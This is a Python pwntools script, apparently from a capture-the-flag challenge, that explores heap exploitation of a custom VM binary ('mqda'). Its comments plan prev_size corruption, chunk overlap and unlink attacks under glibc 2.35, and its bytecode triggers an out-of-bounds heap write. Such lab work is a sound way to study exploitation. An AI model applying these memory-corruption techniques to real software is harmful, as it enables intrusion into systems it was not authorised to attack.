#!/usr/bin/env python3
"""
Let's try a different approach: heap spray.

Since we can write OOB at specific offsets, let's:
1. Create many pages in a controlled order
2. OOB write from one page to another's header/data

The page structure is:
  - malloc(0x104) = 4-byte header (VM addr) + 256-byte data
  - But usable_size is 0x108
  
When we write at offset 0x100-0x103, we're writing into next chunk's prev_size.

If we then FREE a chunk, and the prev_size is corrupted, we might get:
- Chunk consolidation with fake previous chunk
- Overlap with another chunk

Let me analyze if we can trigger unlink attacks.
"""
from pwn import *

context.log_level = 'error'

def mov_reg_imm(reg, imm32):
    return bytes([0x41, reg]) + p32(imm32)

def push_reg(reg):
    return bytes([0x02, reg])

def hlt():
    return bytes([0x00])

# In glibc 2.35, safe unlinking checks make direct unlink impossible
# But if we can create chunk overlap, we can still exploit

# The cleanup frees pages that have all-zero data
# This means any page we write to will NOT be freed (unless we write zeros)

# After execution ends, ALL pages are freed in a loop.
# If prev_size is corrupted, during this mass free we might get overlap

# Strategy:
# 1. Allocate code page (0x10000)
# 2. Allocate stack page (0x20000) 
# 3. Use push to write from stack page[0x100] into code page's prev_size (if adjacent)
# 
# Problem: page allocation order depends on when get_page is called

# Let me map out the allocation sequence:
# - init_vm() allocates vm_state with calloc(1, 0x50)
# - init_vm() allocates code page via get_page(code_addr >> 8)
# - vm_execute accesses stack -> allocates stack page
# - After push underflow, new page is allocated for the new address

print("[*] Heap spray strategy analysis")
print("[*] We need to control which chunk the OOB write lands in")

# If we carefully control the sequence:
# 1. Code at 0x10000 -> page 0x100
# 2. Stack at 0x20100 (offset 0) -> page 0x201
# 3. After PUSH at SP=0x20100, SP becomes 0x200FC
# 4. Page 0x200 is allocated for address 0x200xx
# 5. Next PUSH writes at page 0x200, offset 0xFC+4 = 0x100

# Page 0x200's chunk is allocated AFTER page 0x100 and 0x201
# So its next chunk might be free list or another page

# Let me test this allocation order
code_addr = 0x10000
stack_start = 0x20100  # Offset 0 in page 0x201

code = b''
code += mov_reg_imm(15, stack_start)  # SP = 0x20100
code += mov_reg_imm(0, 0xDEADC0DE)
code += push_reg(0)  # Write at page 0x201 offset 4, SP = 0x200FC
code += push_reg(0)  # Allocates page 0x200, writes at offset 0x100 - OOB!
code += hlt()

print(f"[*] Code: {code.hex()}")

p = process(['./mqda'])
p.recvuntil(b'Code Address> ')
p.sendline(str(code_addr).encode())
p.recvuntil(b'Code Length> ')  
p.sendline(str(len(code)).encode())
p.recvuntil(b'Code> ')
p.send(code)
p.recvuntil(b'Entry IP> ')
p.sendline(str(code_addr).encode())

output = p.recvall(timeout=2)
print(f"[*] Output: {output}")
p.close()
